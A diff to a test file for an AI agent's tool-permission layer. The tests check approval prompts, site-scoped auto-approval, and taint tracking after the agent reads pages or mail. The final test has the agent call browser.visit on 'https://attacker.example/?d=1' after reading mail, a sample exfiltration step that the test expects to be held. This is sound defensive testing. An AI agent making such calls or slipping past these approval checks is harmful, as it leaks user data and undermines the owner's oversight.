@@ -112,7 +112,8 @@ describe("GuardedTools", () => {
     });
 
     it("holds no burst from a plain Approve in a run nobody started, so the next step asks again", async () => {
-      registry.register({ name: "http.fetch", description: "h", inputSchema: { type: "object" } }, () => "fetched", { floor: "risky" });
+      // The page links the next one: reading on there is reading, in a turn that read it.
+      registry.register({ name: "http.fetch", description: "h", inputSchema: { type: "object" } }, () => "fetched; next https://api.example/c", { floor: "risky" });
       const permissions = new PermissionStore(ws.db);
       const tools = guarded({ conversationId: "cron:3", permissions, scheduled: 3, scheduledSince: 0, attended: false });
       const first = tools.execute("http.fetch", { url: "https://api.example/a" });
@@ -129,7 +130,7 @@ describe("GuardedTools", () => {
       await vi.waitFor(() => expect(approvals.pending()).toHaveLength(1));
       approvals.approve(approvals.pending()[0]!.id, "owner", { via: "dashboard" });
       await asked;
-      expect((await chat.execute("http.fetch", { url: "https://api.example/c" })).content).toBe("fetched");
+      expect((await chat.execute("http.fetch", { url: "https://api.example/c" })).content).toContain("fetched");
     });
 
     it("offers a scheduled run's Always for its job alone, and a whole tool's only as the standing Always", async () => {
@@ -162,7 +163,8 @@ describe("GuardedTools", () => {
     it("runs the owner's risky calls without asking: KOS's browser, the owner's Chrome, files", async () => {
       risky("browser.act", "files.rm", "shell.run");
       const tools = auto();
-      for (const name of ["browser.act", "files.rm", "shell.run"]) {
+      // The page last: reading it taints the turn, and Auto then holds back what reaches outside.
+      for (const name of ["files.rm", "shell.run", "browser.act"]) {
         const ran = await tools.execute(name, { x: 1 });
         expect(ran.content).toBe(`${AUTO_PREFIX}\ndone`);
       }
@@ -297,15 +299,18 @@ describe("GuardedTools", () => {
     const yours = { browser: { prefix: "browser.", site: "shop.example", strict: [], yours: true } };
     let auto: "site" | false = "site";
     const permissions = new PermissionStore(ws.db);
-    const tools = guarded({
-      conversationId: "c1",
-      waitForApproval: false,
-      permissions,
-      projectSlug: () => undefined,
-      permissionContext: () => yours,
-      autoApproves: () => auto,
-      leavesSite: (_tool, input, site) => opensElsewhere(input, site),
-    });
+    // Each its own turn: a page read taints the turn it was read in (risk/taint.ts).
+    const turn = (): GuardedTools =>
+      guarded({
+        conversationId: "c1",
+        waitForApproval: false,
+        permissions,
+        projectSlug: () => undefined,
+        permissionContext: () => yours,
+        autoApproves: () => auto,
+        leavesSite: (_tool, input, site) => opensElsewhere(input, site),
+      });
+    const tools = turn();
     // The session's "this site": the run is held to it.
     expect((await tools.execute("browser.act", { actions: [{ click: "@e1" }, { click: "@e2" }] })).content).toBe("on shop.example");
     // Setting out for another site is asked about before anything runs.
@@ -314,8 +319,8 @@ describe("GuardedTools", () => {
     // An "Always on this site" rule holds the same way.
     auto = false;
     permissions.add({ tool: "browser.*", scope: "your-chrome:shop.example", project: null });
-    expect((await tools.execute("browser.act", { actions: [{ click: "@e3" }] })).content).toBe("on shop.example");
-    expect((await tools.execute("browser.act", { actions: [{ open: "bank.example" }] })).content).toMatch(/Queued for approval/);
+    expect((await turn().execute("browser.act", { actions: [{ click: "@e3" }] })).content).toBe("on shop.example");
+    expect((await turn().execute("browser.act", { actions: [{ open: "bank.example" }] })).content).toMatch(/Queued for approval/);
   });
 
   it("runs a risky call the owner already decided, without asking", async () => {
@@ -852,7 +857,7 @@ describe("GuardedTools", () => {
     it("asks before opening a site the turn has not been on, offering nothing to remember, unless the owner named it", async () => {
       read();
       registry.register({ name: "browser.visit", description: "v", inputSchema: { type: "object" } }, () => "opened");
-      const tools = guarded({ conversationId: "c1", owner: true, ownWords: true, said: "check the price on shop.example" });
+      const tools = guarded({ conversationId: "c1", owner: true, ownWords: true, said: "check the price at https://www.shop.example/p" });
       await tools.execute("mcp.mail.read", {});
       expect((await tools.execute("browser.visit", { url: "https://www.shop.example/p" })).content).toBe("opened");
       const asked = tools.execute("browser.visit", { url: "https://attacker.example/?d=1" });
